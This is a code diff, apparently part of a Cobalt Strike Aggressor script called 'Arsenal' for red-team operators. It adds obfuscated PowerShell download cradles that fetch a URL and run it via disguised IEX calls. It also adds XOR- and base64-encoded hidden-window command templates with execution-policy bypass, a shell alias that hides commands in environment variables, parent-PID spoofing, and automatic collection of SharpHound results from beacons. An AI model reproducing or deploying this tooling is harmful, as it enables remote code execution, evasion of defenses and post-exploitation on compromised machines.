+        "\$w=(New-Object Net.WebClient);\$u=\$w.((((\$w).PsObject.Methods)|?{(Item Variable:\_).Value.Name-clike'D*g'}).Name).Invoke('##URL##')",
+
+        # Net.WebRequest
+        "\$u=([IO.StreamReader]::new([Net.WebRequest]::Create('##URL##').GetResponse().GetResponseStream()).ReadToEnd())",
+
+        # Msxml2.XMLHTTP COM object
+        "\$c=New-Object -ComObject MsXml2.ServerXmlHttp;\$c.Open('GET','##URL##',0);\$c.Send();\$u=\$c.ResponseText"
+    );
+
+    # Use $u variable to obtain downloaded data.
+    @executionPrimitives = @(
+        # Unsafe IEX()
+        "IEX(\$u)",
+
+        "&(DIR Alias:/I*X)(\$u)",
+        "\$u|&(DIR Alias:/I*X)",
+
+        "&(GCM I*e-E*)(\$u)",
+        "\$u|&(GCM I*e-E*)",
+
+        "&(''.SubString.ToString()[67,72,64]-Join'')(\$u)",
+        "\$u|&(''.SubString.ToString()[67,72,64]-Join'')"
+    );
+
+
+    if (%arsenal::defaults["use_unsafe_encodedcommand_and_iex"] == 2) {
+        $cradle = "IEX (New-Object Net.Webclient).DownloadString(' $+ $url $+ ')";
+    }
+    else {
+        # Skip known bad combinations of above primitives.
+        # Known to not working (download - execution): 
+        #   * 3 - 3, 3 - 4
+        while(true) {
+            if (%arsenal::defaults["use_unsafe_encodedcommand_and_iex"] == 1) {
+                $download = rand(size(@downloadPrimitives));
+                $execution = rand(size(@executionPrimitives));
+            } 
+            else {
+                $download = rand(size(@downloadPrimitives) - 1) + 1;
+                $execution = rand(size(@executionPrimitives) - 1 ) + 1;
+            }
+
+            if ($download == 3 && ($execution >= 3 && $execution <= 4)) { 
+                continue; 
+            }
+            break;
+        }
+
+        $downloadPrimitive = replace(@downloadPrimitives[$download], '##URL##', $url);
+        $executionPrimitive = @executionPrimitives[$execution];
+
+        $cradle = $downloadPrimitive . ";" . $executionPrimitive;
+        $cradle = replace($cradle, ";;", ";");
+    }
+
+    arsenal::debug("hooked POWERSHELL_DOWNLOAD_CRADLE (download: $+ $download $+ ; execution: $+ $execution $+ ): $cradle");
+    return $cradle;
+}
+
+set POWERSHELL_COMMAND {
+    local('$strategy $ley $enc $stub $cmd');
+
+    $cmd = "";
+
+    if (%arsenal::defaults["use_unsafe_encodedcommand_and_iex"] == 1) {
+        $strategy = rand(4);
+    } 
+    else {
+        $strategy = rand(3) + 1;
+    }
+
+    if ((%arsenal::defaults["use_unsafe_encodedcommand_and_iex"] == 2) || ($strategy == 0)) {
+        #
+        # Default, built in and unsafe Cobalt Strike powershell command template.
+        #
+        $script = transform($1, "powershell-base64");
+    
+        if ($2) {
+            # remote command (e.g., jump psexec_psh)
+            $cmd = "powershell -nop -w hidden -encodedcommand $script";
+        }
+        else {
+            # local command
+            $cmd = "powershell -nop -exec bypass -EncodedCommand $script";
+        }
+    }
+    else if ($strategy == 1) {
+        if ($2) {
+            $cmd = "powershell -nop -noni -w hidden -c \" $+ $1 $+ \"";
+        }
+        else {
+            $cmd = "powershell -nop -noni -ep bypass -w hidden -c \" $+ $1 $+ \"";
+        }
+    }
+    else if($strategy == 2) {
+        $key = rand(254) + 1;
+        $enc = replace(transform(str_xor($1, chr($key)), "array"), " ", "");
+        $stub = "&([scriptblock]::Create((( $+ $enc $+ )|%{\$_-bxor $+ $key $+ }|%{[char]\$_})-join''))";
+        
+        if ($2) {
+            $cmd = "powershell -nop -noni -w hidden -c \" $+ $stub $+ \"";
+        }
+        else {
+            $cmd = "powershell -nop -noni -ep bypass -w hidden -c \" $+ $stub $+ \"";
+        }
+    }
+    else if ($strategy == 3) {
+        $key = rand(254) + 1;
+        $enc = base64_encode(str_xor($1, chr($key)));
+
+        $stub = "\$t=([type]'Convert');&([scriptblock]::Create((\$t::((\$t.GetMethods()|?{\$_.Name-clike'F*g'}).Name)(' $+ $enc $+ ')|%{\$_-bxor $+ $key $+ }|%{[char]\$_})-join''))";
+
+        if ($2) {
+            $cmd = "powershell -nop -noni -w hidden -c \" $+ $stub $+ \"";
+        }
+        else {
+            $cmd = "powershell -nop -noni -ep bypass -w hidden -c \" $+ $stub $+ \"";
+        }
+    }
+
+    arsenal::debug("hooked POWERSHELL_COMMAND (strategy: $strategy $+ ): $cmd");
+    return $cmd;
+}
+
+alias shell {
+    local('$args');
+    $args = substr($0, strlen("shell "));
+
+    btask($1, "Tasked beacon to run shell (OPSEC): $args", "T1059");
+    arsenal::debug("OPSEC shell: set _=\" $+ $args $+ \" & %COMSPEC% /C %_% & set _=");
+
+    bsetenv!($1, "_", $args);
+    beacon_execute_job($1, "%COMSPEC%", " /C %_%", 0);
+    bsetenv!($1, "_", "");
+}
+
+alias rm {
+    local('$arg');
+    shift(@_);
+
+    foreach $arg (@_) {
+        brm($1, $arg);
+    }
+}
+
+alias ppid {
+    local('$args');
+    bppid($1, $2);
+
+    arsenal::appendNote($1, "(ppid: $2 $+ )");
+
+    if ($2 eq "") {
+        arsenal::removeNote($1, "(ppid)");   
+    }
+}
+
+#
+# END OF ALIASES
+# ==============================================================================
+#
+
+
+# ===================================================================================
+# HTTP Request
+#
+
+#
+# arsenal::httpRequest($method, $url, $body);
+#
+sub arsenal::httpRequest {
+    local('$method $url $body $n $bodyLen $maxRedirectsAllowed $urlobj $con $outstream $handle $responseCode @content $response');
+    $method = $1;
+    $url = $2;
+    $body = $3;
+    $n = 0;
+
+    if(size(@_) == 4) { $n = $4; }
+
+    $bodyLen = strlen($body);
+    $maxRedirectsAllowed = 10;
+    if ($n > $maxRedirectsAllowed) {
+        warn("Exceeded maximum number of redirects: $method $url ");
+        return "";
+    }
+
+    try
+    {
+        $urlobj = [new java.net.URL: $url];
+        $con = $null;
+        $con = [$urlobj openConnection];
+        [$con setRequestMethod: $method];
+        [$con setInstanceFollowRedirects: true];
+        [$con setRequestProperty: "Accept", "*/*"];
+        [$con setRequestProperty: "Cache-Control", "max-age=0"];
+        [$con setRequestProperty: "Connection", "keep-alive"];
+        [$con setRequestProperty: "User-Agent", $USER_AGENT];
+
+        if($bodyLen > 0) {
+            [$con setDoOutput: true];
+            [$con setRequestProperty: "Content-Type", "application/x-www-form-urlencoded"];
+        }
+
+        $outstream = [$con getOutputStream];
+        if($bodyLen > 0) {
+            [$outstream write: [$body getBytes]];
+        }
+
+        $inputstream = [$con getInputStream];
+        $handle = [SleepUtils getIOHandle: $inputstream, $outstream];
+        $responseCode = [$con getResponseCode];
+
+        if(($responseCode >= 301) && ($responseCode <= 304)) {
+            $loc = [$con getHeaderField: "Location"];
+            return arsenal::httpRequest($method, $loc, $body, $n + 1);
+        }
+
+        @content = readAll($handle);
+        $response = "";
+        foreach $line (@content) {
+            $response .= $line . "\r\n";
+        }
+
+        if((strlen($response) > 2) && (right($response, 2) eq "\r\n")) {
+            $response = substr($response, 0, strlen($response) - 2);
+        }
+
+        return $response;
+    }
+    catch $message
+    {
+       warn("HTTP Request failed: $method $url : $message ");
+       printAll(getStackTrace());
+       return "";
+    }
+}
+
+# ===================================================================================
+
+sub arsenal::getDomain {
+    local('$beacon $index $note');
+    if (len($CURRENT_DOMAIN_NAME) == 0) {
+        foreach $beacon (beacons()) {
+            $note = arsenal::getnote($beacon['id']);
+
+            $index = find($note, 'domain: [\w-\.]+');
+            if ($index) {
+                $domainName = matches($note, 'domain: ([\w-\.]+)')[0];
+                $CURRENT_DOMAIN_NAME = $domainName;
+                break;
+            }
+        }
+    }
+}
+
+# extract string based on static patterns
+sub arsenal::extractString {
+    local('$string $startPattern $endPattern $stringStart $stringEnd $param');
+    $string = $1;
+    $startPattern = $2;
+    $endPattern = $3;
+
+    $stringStart = indexOf($string, $startPattern);
+    $stringEnd =  indexOf($string, $endPattern);
+
+    # Cobalt Strike sometimes crashes when null value is sent to substr
+    if ( ($stringStart is $null) || ($stringEnd is $null) ) {
+        return "";
+    }
+
+    $param = substr($string, $stringStart + strlen($startPattern), $stringEnd);
+    return ["$param" trim];
+}
+
+sub arsenal::parseBloodhoundOutput {
+    local('$bid $out $start_pattern $stop_pattern $resultsFileName');
+    $bid = $1;
+    $out = $2;
+
+    try {
+        $start_pattern = "Compressing data to ";
+        $stop_pattern = "You can upload this file directly to the UI";
+
+        $resultsFileName = arsenal::extractString($out, $start_pattern, $stop_pattern);
+
+        if (strlen($resultsFileName) > 0 ) {
+            btask($bid, "Tasked beacon to download SharpHound results: $resultsFileName");
+            bdownload($bid, $resultsFileName);
+            #brm($bid, $resultsFileName);
+        }
+        else {
+            throw "Could not extract SharpHound results filename!";
+        }
+    }
+    catch $message { 
+        btask($bid, "WARNING: Unable to obtain SharpHound results filename.\nERROR: $message");
+        arsenal::debug("WARNING: Unable to obtain SharpHound results filename.\nERROR: $message");
+        arsenal::debug(getStackTrace()); 
+    }
+}
+
+sub arsenal::parseSeatBeltOutput {
+    local('$bid $out $start_pattern $stop_pattern $domain');
+    $bid = $1;
+    $out = $2;
+
+    try
+    {
+        $start_pattern = "  Domain Name                   :  ";
+        $stop_pattern = "  Username ";
+
+        $domain = arsenal::extractString($out, $start_pattern, $stop_pattern);
+        if (strlen($domain) > 0 )
+        {
+            $domainName = ["$domain" trim];
+            if($bid in keys(%OPERATING_BEACONS)) { 
+                %OPERATING_BEACONS[$bid]["domain"] = $domainName; 
+            }
+            arsenal::appendNote($bid, "(domain: $domainName $+ )");
+        }
+        else
+        {
+            throw "Could not extract SeatBelt domain name!";
+        }
+    }
+    catch $message 
+    { 
+        btask($bid, "WARNING: Unable to extract SeatBelt domain name.\nERROR: $message");
+        arsenal::debug("WARNING: Unable to extract SeatBelt domain name.\nERROR: $message");
+        arsenal::debug(getStackTrace()); 
+    }
+}
+
+sub arsenal::removeStaleBloodhoundResults {
+    local('$bid $out $start_pattern $stop_pattern $resultsFileName');
+    $bid = $1;
+    $out = $2;
+
+    try {
+        $start_pattern = "download of ";
+        $stop_pattern = "_BloodHound.zip is complete";
+
+        $resultsFileName1 = arsenal::extractString($out, $start_pattern, $stop_pattern);
+
+        if ((strlen($resultsFileName) > 0) || ($out ismatch 'download of (\w+_BloodHound.zip) is complete')) {
+            if(strlen($resultsFileName) == 0) {
+                $resultsFileName = matched();
+            }
+
+            arsenal::debug("Removing stale bloodhound results zip file: $resultsFileName");
+            brm($bid, $resultsFileName);
+        }
+        else {
+            throw "Could not extract SharpHound results filename!";
+        }
+    }
+    catch $message { 
+        btask($bid, "WARNING: Unable to remove SharpHound stale results file.\nERROR: $message");
+        arsenal::debug("WARNING: Unable to remove SharpHound stale results file.\nERROR: $message");
+        arsenal::debug(getStackTrace()); 
+    }
+}
+
+alias syncall {
+    if(strlen(%arsenal::defaults["download_files_dst_path"]) > 0) {
+        arsenal::syncDownloadedFiles();
+        blog($1, "Synced all downloaded files to: " . %arsenal::defaults["download_files_dst_path"]);
+    }
+}
+
+alias execute-assembly {
+    local('$bid $localpath $args $tmp $tmp2');
+    $bid = shift(@_);
+    $localpath = shift(@_);
+    $args = "";
+
+    $pos = indexOf($0, $localpath) + strlen($localpath) + 1;
+    
+    if ($pos < strlen($0)) {
+    	$args = substr($0, $pos);
+    }
+
+    if($localpath is $null || strlen($localpath) == 0) {
+        prompt_file_open("Choose an assembly to execute", $null, false, lambda({
+            bupload($bid, $1);
+        }, $bid => $bid));
+        return;
+    }
+
+    if($localpath is $null || strlen($localpath) == 0) {
+        berror($bid, "Assembly path must be specified.");
+        return;
+    }
+
+    if(!-exists $localpath) {
+        if(strlen(%arsenal::defaults["assemblies_storage_path"]) > 0) {
+        	$tmp = getFileProper(%arsenal::defaults["assemblies_storage_path"], $localpath);
+        	$tmp2 = $tmp . ".exe";
+
+            if((-exists $tmp) && (!-isDir $tmp)) {
+                $localpath = $tmp
+            }
+            else if((-exists $tmp2) && (!-isDir $tmp2)) {
+                $localpath = $tmp2;
+            }
+            else {
+                berror($bid, "Specified assembly file could not be found: ( $+ $localpath $+ )");
+                return;
+            }
+
+            blog($bid, "Auto-located specified .NET assembly at: " . $localpath);
+        }
+        else {
+            berror($bid, "Specified assembly file does not exist: ( $+ $localpath $+ ). Tried looking at this path: " . %arsenal::defaults["assemblies_storage_path"]);
+            return;
+        }
+    }
+
+    btask($bid, "Tasked beacon to run .NET program: \c7" . getFileName($localpath) . " $args \o");
+    arsenal::debug("augmented execute-assembly: bid='" . $bid . "', localpath='" . $localpath . "', args='" . $args . "'");
+    bexecute_assembly!($bid, $localpath, $args);
+}
+
+sub arsenal::syncDownloadedFiles {
+    this('$once');
+    local('$skipexisting $auto $lpath $name $dstpath $tmp $count @downloaded @processed $fsize');
+
+    if(%arsenal::defaults["existing_downloaded_files_overriding"] eq "skip") {
+        $skipexisting = 1;
+    }
+    else {
+        $skipexisting = 0;
+    }
+
+    $auto = 0;
+    if(size(@_) >= 1 && ($1 eq "auto")) {
+        $auto = 1;
+        arsenal::debug("Syncall auto mode.");
+    }
+
+    arsenal::debug("Syncing downloaded files.");
+
+    if(strlen(%arsenal::defaults["download_files_dst_path"]) == 0) {
+        if ($once == 0) {
+            show_message("In order to have your downloaded files automatically synced,\nplease set up a local destination path first. Go to Arsenal -> Options.");
+            $once = 1;
+        }
+
+        arsenal::debug("Cannot sync files as local destination path is not set (download_files_dst_path)");
+        return;
+    }
+
+    if(size(downloads()) == 0) {
+        arsenal::debug("syncDownloadedFiles: No files to sync at the moment.");
+        return;
+    }
+
+    foreach $download (downloads()) {
+        ($lpath, $name, $fsize) = values($download, @("lpath", "name", "size"));
+
+        $dstpath = getFileProper(%arsenal::defaults["download_files_dst_path"], $name);
+        if(-exists $dstpath) {
+
+            if(($auto == 1) || ($skipexisting == 1)) { 
+                if($dstpath !in @processed) {
+                    push(@processed, $dstpath);
+                    arsenal::debug("Skipping existing synced file: $dstpath");
+                }
+                continue; 
+            }
+
+            $tmp = $dstpath;
+            $count = 1;
+            while(-exists $tmp) {
+                $tmp = $dstpath . "." . $count;
+                $count += 1;
+            }
+
+            if($dstpath !in @processed) {
+                push(@processed, $dstpath);
+                arsenal::debug("File ( $+ $dstpath $+ ) already exists locally. Will save as: $tmp");
+            }
+            $dstpath = $tmp;
+        }
+
+        if($lpath !in @downloaded) {
+            push(@downloaded, $lpath);
+            sync_download($lpath, $dstpath, lambda({
+                #arsenal::debug("Downloaded ( $+ $1 $+ ) to ( $+ $dstpath $+ ).");
+            }, $dstpath => $dstpath));
+        }
+    }
+
+    arsenal::info("Synced all downloaded files.");
+}
+
+sub arsenal::note {
+    if(%arsenal::defaults["add_beacon_notes"] eq "true") {
+        #bnote!($1, $2);
+
+        if($1 in keys(%OPERATING_BEACONS)) { 
+            %OPERATING_BEACONS[$1]["notes"] = $2; 
+        }
+        else {
+            %OPERATING_BEACONS[$1] = %();
+            %OPERATING_BEACONS[$1]["notes"] = $2; 
+        }
+        saveBeaconsMetadataCache();
+    }
+}
+
+alias beacon_metadata {
+    local('$k $v $out');
+
+    if($1 !in keys(%OPERATING_BEACONS)) {
+        blog($1, "This beacon has currently no metadat collected.");
+    }
+
+    $out = "Beacon's metadata collected so far:\n";
+
+    foreach $k => $v (%OPERATING_BEACONS[$1]) {
+        $out .= "\t" . $k . ":\t" . $v . "\n";
+    }
+
+    blog($1, $out);
+}
+
+sub arsenal::_fixNote {
+    local('$note');
+    $note = $1;
+    $note = replace($note, ';\s+;', "; ");
+    $note = replace($note, '; ;', ';');
+    $note = replace($note, '\(; ', '(');
+    $note = replace($note, ';\s+\)', ')');
+    $note = replace($note, ';\s+', '; ');
+    $note = replace($note, '\(\s+', '(');
+    $note = replace($note, '\s+\)', ')');
+    return $note;
+}
+
+#
+# Appends automatic notes to the current Beacon's note value.
+# In order for this function to work as intended, the appended notes should be
+# in format:
+#       note "(verb: value1, param2: value2)"
+#
+# Assuming current Beacon's note is following:
+#       note = "(domain: foo)"
+#
+# The resulting note will be:
+#       note = "(domain: foo, verb: value1, param2: value2)"
+#
+sub arsenal::appendNote {
+    local('$note $gotOpenParen $append $col $verb $verbStartInNote $verbEndInNote $tmp $lastParen');
+
+    $note = arsenal::getnote($1);
+    $note = ["$note" trim];
+    $append = $2;
+    $gotOpenParen = $null;
+    $openParen = indexOf($note, '(');
+    if((strlen($note) > 0) && ($openParen || (charAt($note, 0) eq '('))) {
+        $gotOpenParen = 1;
+    }
+
+    if((strlen($note) > 0)) {
+        if ((charAt($append, 0) eq "(") && ($gotOpenParen)) {
+
+            $col = indexOf($append, ':');
+            if($col is $null) {
+                $col = strlen($append);
+                if(right($append, 1) eq ')') { 
+                    $col = $col - 1; 
+                }
+            }
+            $verb = substr($append, 1, $col);
+            $append = substr($append, 1, strlen($append) - 1);
+
+            if(indexOf($note, $verb) eq $null) {
+                if(right($note, 1) eq ")") {
+                    $note = substr($note, 0, strlen($note) - 1) . "; " . $append . ")";
+                }
+                else {
+                    $note .= " " . $2;
+                }
+            }
+            else {
+                $verbStartInNote = indexOf($note, $verb, $openParen);
+                $verbEndInNote = indexOf($note, ';', $verbStartInNote);
+                if($verbEndInNote) {
+                    $verbEndInNote = $verbEndInNote + 1;
+                }
+
+                if($verbEndInNote is $null) {
+                    $verbEndInNote = lindexOf($note, ')');
+                }
+
+                $tmp = substr($note, 0, $verbStartInNote) . substr($note, $verbEndInNote);
+                $lastParen = lindexOf($tmp, ')');
+                $note = substr($tmp, 0, $lastParen) . "; " . $append . substr($tmp, $lastParen);
+            }
+        } else {
+            $note .= " " . $append;
+        }
+    }
+    else {
+        $note = $append;
+    }
+
+    $note = arsenal::_fixNote($note);
+    arsenal::note($1, $note);
+}
+
+sub arsenal::insertNote {
+    local('$note $insert $col $verb $gotOpenParen $tmp $openParen');
+
+    $note = arsenal::getnote($1);
+    $insert = $2;    
+    $gotOpenParen = $null;
+    $openParen = indexOf($note, '(');
+    if((strlen($note) > 0) && ($openParen || (charAt($note, 0) eq '('))) {
+        $gotOpenParen = 1;
+    }
+
+    if((strlen($note) > 0)) {
+        if ((charAt($insert, 0) eq "(") && ($gotOpenParen)) {
+            $col = indexOf($insert, ':');
+            if($col is $null) {
+                $col = strlen($insert);
+                if(right($insert, 1) eq ')') { 
+                    $col = $col - 1; 
+                }
+            }
+            $verb = substr($insert, 1, $col);
+            $insert = substr($insert, 1, strlen($insert) - 1);
+
+            if(indexOf($note, $verb) eq $null) {
+                if(left($note, 1) eq "(") {
+                    $note = "(" . $insert . "; " . substr($note, 1, strlen($note) - 1) . ")";
+                }
+                else {
+                    $note = $2 . " " . $note;
+
+                    $tmp = substr($note, 0, $openParen + 1) . $insert . "; " . substr($note, $openParen + 1);
+                    $note = $tmp;
+                }
+            }
+            else {
+                $verbStartInNote = indexOf($note, $verb, $openParen);
+                $verbEndInNote = indexOf($note, ';', $verbStartInNote);
+                if($verbEndInNote) {
+                    $verbEndInNote = $verbEndInNote + 1;
+                }
+
+                if($verbEndInNote is $null) {
+                    $verbEndInNote = lindexOf($note, ')');
+                }
+
+                $tmp = substr($note, 0, $verbStartInNote) . substr($note, $verbEndInNote);
+                $openParen = indexOf($tmp, '(') + 1;
+                $note = substr($tmp, 0, $openParen) . $insert . "; " . substr($tmp, $openParen);
+            }
+        } else{
+            $note = $insert . " " . $note;
+        }
+    }
+    else {
+        $note = $insert;
+    }
+
+    $note = arsenal::_fixNote($note);
+    arsenal::note($1, $note);
+}
+
+sub arsenal::_removeNote {
+    local('$note $section $secname $posStart @m $tmp');
+
+    $note = arsenal::getnote($1);
+    $section = $2;   
+
+    if((left($section, 1) eq '(') && (right($section, 1) eq ')')) {
+        $secname = substr($section, 1, -1);
+        $posStart = indexOf($note, $secname . ":");
+        if($posStart) {
+            $rex = '(?:; )?' . $secname . ': ([^;\)]+(?:; )?)';
+            @m = matches($note, $rex);
+            if(size(@m) > 0) {
+                $tmp = strlen($secname . ": ") + strlen(@m[0]) + $posStart;
+                $note = substr($note, 0, $posStart) . substr($note, $tmp);
+ 
+                return arsenal::_fixNote($note);
+            }
+        }
+    }
+
+    $posStart = indexOf($note, $section);
+    if($posStart) {
+        $note = substr($note, 0, $posStart) . substr($note, strlen($section) + $posStart);
+    }
+    
+    return arsenal::_fixNote($note);
+}
+
+sub arsenal::removeNote {
+    local('$note');
+    $note = arsenal::_removeNote($1, $2);
+    arsenal::note($1, $note);
+}
+
+sub arsenal::findSuitableParentPID {
+    local('$_bid $_callback $_processName $_userName');
+    $_bid = $1;
+    $_callback = $2;
+    $_processName = $3;
+    $_userName = binfo($1, "user");
+
+    if (right($_userName, 2) eq ' *') {
+        $_userName = substr($_userName, 0, strlen($_userName) - 2);
+    }
+
+    bps($_bid, lambda({
+        local('$tab $entry $name $pid $ppid $arch $user');
+        foreach $entry (split("\n", $2)) {
+            ($name, $ppid, $pid, $arch, $user) = split("\\s+", $entry);
+
+            # "NT AUTHORITY" contains space, thus breaking our split results. Here's a workaround for that
+            if($user eq "NT") {
+                $user = substr($entry, indexOf($entry, "NT "));
+                $tab = indexOf($user, "\t");
+                if ($tab) {
+                    $user = substr($user, 0, $tab);
+                }
+            }
+
+            if (($pid) && ($name eq $processName)) {
+                if($user) {
+                    if( ($userName isin $user) || ($user isin $userName) ) {
+                        [$callback : $bid, $pid, "\t" . $entry];
+                        break;
+                    }
+                }
+            }
+        }
+    }, $bid => $_bid, $callback => $_callback, $userName => $_userName, $processName => $_processName));
+}
+
+sub arsenal::renameBeaconTabs {
+    local('$bid');
+
+    foreach $bid (beacon_ids()) {
+        arsenal::renameBeaconTab($bid);
+    }
+}
+
+sub arsenal::renameBeaconTab {
+    local('$client $srctabname $i $dsttabname $apptabs $applicationTab');
+
+    if(%arsenal::defaults["beacon_tab_name_format"] is $null || strlen(%arsenal::defaults["beacon_tab_name_format"]) == 0) {
+        return;
+    }
+
+    $bid = $1;
+    $client = getAggressorClient();
+    $apptabs = [[$client tabs] apptabs];
+
+    $srctabname = "Beacon " . beacon_info($bid, 'host') . "@" . beacon_info($bid, 'pid');
+    $srctabname = [$srctabname trim];
+    
+    for ( $i = 0; $i < [$apptabs size] ; $i++) {
+        $applicationTab = [$apptabs get: $i];
+
+        if ([$applicationTab bid] eq $bid) {
+            $currtabname = [[[$applicationTab label] getText] trim];
+
+            if ($currtabname eq $srctabname) {
+                $dsttabname = %arsenal::defaults["beacon_tab_name_format"];
+
+                foreach $beacon (beacons()) {
+                    if ($beacon['id'] eq $bid) {
+                        foreach $k => $v ($beacon) {
+                            $dsttabname = replace($dsttabname, '<' . $k . '>', $v);
+                        }
+                    }
+                }
+
+                arsenal::debug("Renaming tab from \" $+ $srctabname $+ \" to \" $+ $dsttabname $+ \"");
+                #setField($applicationTab, title => $dsttabname);
+                [[$applicationTab label] setText: $dsttabname . "   "];
+            } 
+        }
+    }
+}
+
+alias autoppid {
+    local('$processName $userName $params');
+    $params = "";
+
+    if(strlen($0) > strlen("autoppid ")) {
+        $params = substr($0, strlen("autoppid "));
+    }
+
+    $processName = %arsenal::defaults["parent_process_name"];
+    $mode = "unprivileged";
+
+    if (-isadmin $1) {
+        $processName = %arsenal::defaults["privileged_parent_process_name"];
+        $mode = "privileged*";
+    }
+
+    $userName = binfo($1, "user");
+
+    if (right($userName, 2) eq ' *') {
+        $userName = substr($userName, 0, strlen($userName) - 2);
+    }
+
+    if($params ne "quiet") {
+        btask($1, "Tasked Beacon to find $mode $processName running as $userName and make it the PPID.");
+    }
+
+    arsenal::findSuitableParentPID($1, lambda({
+        if($params ne "quiet") {
+            blog!($1, "Future post-ex jobs will be spawned with fake PPID set to:\n$3");
+            bppid($1, $2);
+        } else {
+            bppid!($1, $2);
+        }
+        %OPERATING_BEACONS[$1]['autoppid'] = $2;
+        arsenal::appendNote($1, "(ppid: $2 $+ )");
+    }, $params => $params), $processName);
+}
+
+#
+# ==============================================================================================
+#
+
+#
+# saveOptions(
+#   $filename, 
+#   %dictWithOptions, 
+#   [optional]"save.these.options.with.prefix.in.name")
+#
+sub saveOptions {
+    local('$handle $i $newl $updated $append @output @contents $optionsPrefix $fileName %options $p $k $key $val %fetchedOptions');
+    $fileName = $1;
+    %options = $2;
+    $optionsPrefix = $3;
+
+    @output = @();
+    @contents = @();
+
+    if(-exists $fileName) {
+        if(!-canread $fileName) {
+            show_error("Cannot read settings file: $fileName");
+            return;
+        }
+
+        $handle = openf($fileName);
+        if($handle) {
+            while $line (readln($handle)) {
+                $line = ["$line" trim];
+                push(@contents, $line);
+            }
+            closef($handle);
+        }
+    }
+
+    $handle = openf(">" . $fileName);
+    if($handle is $null) {
+        show_error("Could not save options: Unable to open/create file.");
+        return;
+    }
+
+    if(size(@contents) > 0) {
+        for($i = 0; $i < size(@contents); $i++) {
+            if(strlen(@contents[$i]) < 2) {
+                push(@output, @contents[$i]);
+                continue;
+            }
+            else if('#*' iswm @contents[$i]) {
+                push(@output, @contents[$i]);
+                continue;
+            }   
+
+            $updated = 0;
+            if(@contents[$i] ismatch '([^=]+)\s*=\s*(.+)') {
+                ($key, $oldval) = matched();
+                $key = ["$key" trim];
+                $oldval = ["$oldval" trim];
+
+                foreach $key2 (keys(%options)) {
+                    $k = $optionsPrefix . $key2;
+
+                    if($key eq $k) {
+                        $val = %options[$key2];
+                        $val = ["$val" trim];
+
+                        $newl = substr(@contents[$i], 0, indexOf(@contents[$i], $oldval));
+
+                        if(strlen($val) == 0) {
+                            $newl .= "\"\"";
+                        }
+                        else if(indexOf($val, ' ')) {
+                            $newl .= "\" $+ $val $+ \"";
+                        }
+                        else {
+                            $newl .= $val;
+                        }
+
+                        push(@output, $newl);
+
+                        $updated = 1;
+                    }
+                }
+            }
+
+            if($updated == 0) {
+                push(@output, @contents[$i]);
+            }
+        }
+    }
+    else {
+        foreach $key (keys(%options)) {
+            $k = $optionsPrefix . $key;
+            $val = %options[$key];
+            $val = ["$val" trim];
+
+            if(strlen($val) == 0) {
+                push(@output, "$k = \"\"");
+            }
+            else if(indexOf($val, ' ')) {
+                push(@output, "$k = \" $+ $val $+ \"");
+            }
+            else {
+                push(@output, "$k = $val");
+            }
+        }
+    }
+
+    printAll($handle, @output);
+    closef($handle);
+}
+
+#
+# %fetchedOptionsDict = loadOptions($filename, [optional]"load.only.options.with.prefix.in.name")
+#
+sub loadOptions {
+    local('$handle @lines $fileName $p $key $loadPrefix $val %fetchedOptions');
+    $fileName = $1;
+    $loadPrefix = $2;
+    %fetchedOptions = %();
+
+    if(!-exists $fileName) {
+        show_error("No saved settings file ( $+ $fileName $+ )!");
+        return $null;
+    }
+
+    if(!-canread $fileName) {
+        show_error("Cannot read settings file: $fileName");
+        return $null;
+    }
+
+    $handle = openf($fileName);
+    while $line (readln($handle)) {
+        push(@lines, ["$line" trim]);
+    }
+
+    closef($handle);
+ 
+    for($lineNum = 0; $lineNum < size(@lines); $lineNum++) {
+        $line = @lines[$lineNum];
+
+        if(strlen($line) <= 2) {
+            continue;
+        }
+        else if('#*' iswm $line) {
+            continue;
+        }
+
+        $p = indexOf($line, '=');
+        if ($p) {
+
+            $key = substr($line, 0, $p);
+            $key = ["$key" trim];
+
+            $val = substr($line, $p + 1);
+            $val = ["$val" trim];
+
+            if(strlen($key) == 0) {
+                show_error("Error in config file ( $+ $fileName $+ ) in line $lineNum $+ :\nLine does not conform 'key = value' form, as there is no key:\n\n $line");
+                return $null;
+            }
+
+            if(right($val, 1) eq ";") {
+                $val = substr($val, 0, -1);
+            }
+
+            if(left($val, 1) eq '"') {
+                if(right($val, 1) eq '"') {
+                    $val = substr($val, 1, -1);
+                }
+                else {
+                    show_error("Error in config file ( $+ $fileName $+ ) in line $lineNum $+ :\nUnclosed quote mark on line:\n\n $line");
+                    return $null;
+                }
+            }
+
+            if($loadPrefix && strlen($loadPrefix) > 0) {
+                if(indexOf($key, $loadPrefix) != 0) {
+                    continue;
+                }
+            }
+
+            if($key && strlen($key) > 0) {
+                %fetchedOptions[$key] = $val;
+            }
+            else {
+                %fetchedOptions[$key] = "";
+            }
+        }
+        else {
+            show_error("Error in config file ( $+ $fileName $+ ) in line $lineNum $+ :\nNo 'key = value' assignment in line:\n\n $line");
+            return $null;
+        }
+    }
+
+    return %fetchedOptions;
+}
+
+#
+# ==============================================================================================
+#
+
+
+sub getOptions {
+    local('%opts $pos %beacons');
+
+    %opts = loadOptions($savedSettingsFile);
+    if(size(keys(%opts)) > 0) {
+        $pos = strlen("arsenal.defaults.");
+        foreach $key (keys(%opts)) {
+            if("arsenal.defaults.*" iswm $key) {
+                $k = substr($key, $pos);
+                %arsenal::defaults[$k] = %opts[$key];
+            }
+        }
+    }
+
+    $handle = openf($beaconsCacheFile);
+    if($handle !is $null) {
+        %beacons = %();
+        %beacons = readObject($handle);
+        closef($handle);
+
+        if(%beacons !is $null) {
+            if(size(%beacons) > size(%OPERATING_BEACONS)) {
+                %OPERATING_BEACONS = copy(%beacons);
+                arsenal::debug("Restored Beacons metadata cache. Entries: " . size(%OPERATING_BEACONS));
+            }
+        }
+    }
+
+    arsenal::debug("Arsenal options loaded.");
+}
+
+sub saveBeaconsMetadataCache {
+    local('$handle');
+
+    if(size(%OPERATING_BEACONS) > 0) {
+        $handle = openf(">" . $beaconsCacheFile);
+        if($handle is $null) {
+            show_error("Could not save Beacons cache metadata: Unable to open/create file.");
+        }
+
+        writeObject($handle, %OPERATING_BEACONS);
+        closef($handle);
+    }
+}
+
+sub putOptions {
+    saveOptions($savedSettingsFile, %arsenal::defaults, "arsenal.defaults.");
+    saveBeaconsMetadataCache();
+
+    arsenal::debug("Arsenal options saved.");
+}
+
+sub interpretSize {
+    local('$s $size');
+    $s = 0L;
+    $s = long($1);
+
+    if($s == 0) { 
+        $size = ""; 
+    }
+    else if($s < 1024L) { 
+        $size .= long($s) . "B"; 
+    }
+    else if($s < long(1024L * 1024L)) { 
+        $size = long(round($s / 1024.0, 1));
+        $size .= "KB";
+    }
